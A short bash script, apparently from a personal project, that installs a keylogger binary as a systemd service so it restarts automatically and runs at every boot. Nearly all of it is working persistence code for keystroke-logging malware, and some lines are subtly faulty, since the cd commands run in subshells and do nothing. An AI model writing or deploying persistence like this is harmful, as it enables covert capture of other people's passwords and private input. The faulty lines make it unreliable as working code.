#!/bin/bash
#
# sudo ./startsystemd.sh
#
# This script will make and save the necessary files
#  to get my keylogger to start as a service.
#
# Author: Jonathan Jang

file_writer () {
	if [ -e $filename ]
	then
		echo "File $filename already exists!"
	else
		echo "[Unit]" >> $filename
		echo "Description=Keylogger test as systemd service." >> $filename
		echo "StartLimitIntervalSec=0" >> $filename
		echo >> $filename
		echo "[Service]" >> $filename
		echo "Type=simple" >> $filename
		echo "Restart=always" >> $filename
		echo "RestartSec=1" >> $filename
		echo "ExecStart=/usr/bin/$execname" >> $filename
		echo >> $filename
		echo "[Install]" >> $filename
		echo "WantedBy=multi-user.target" >> $filename
	fi
}

# The start of script
execname="runkeylog"
filename="runkeylog.service"

# Copy where every the exec program for keylog.c is
$(cd ~/Desktop/Keylogger/)
$(cp key /usr/bin/runkeylog)
$(chmod +x /usr/bin/runkeylog)

# Make the Unit file for the systemd service
$(cd /lib/systemd/system)
file_writer
$(mv $filename /lib/systemd/system/$filename)

# Start and Enable the Systemd service
systemctl start $filename
systemctl enable $filename

